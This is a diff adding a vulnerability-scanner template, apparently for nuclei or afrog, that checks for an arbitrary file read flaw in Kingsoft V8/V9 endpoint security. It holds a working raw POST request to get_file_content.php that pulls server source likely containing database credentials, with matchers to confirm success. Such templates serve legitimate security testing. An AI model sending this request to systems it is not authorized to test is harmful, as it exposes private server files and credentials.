@@ -1,0 +1,31 @@
+id: kingsoft-get-file-content-file-read
+
+info:
+  name: 金山终端安全系统V8/V9 get_file_content.php 任意文件读取漏洞
+  author: zan8in
+  severity: high
+  description: |
+    金山 V8/V9 终端安全系统 存在任意文件读取漏洞，攻击者可以通过漏洞下载服务器任意文件
+  reference:
+    - http://wiki.peiqi.tech/wiki/webapp/%E9%87%91%E5%B1%B1/%E9%87%91%E5%B1%B1%20V8%20%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F%20get_file_content.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html
+
+http:
+  - raw:
+      - |
+        POST /receive_file/get_file_content.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        filepath=DFDirect.php
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "mysql:host"
+          - "require_once"
+        part: body
+        condition: and
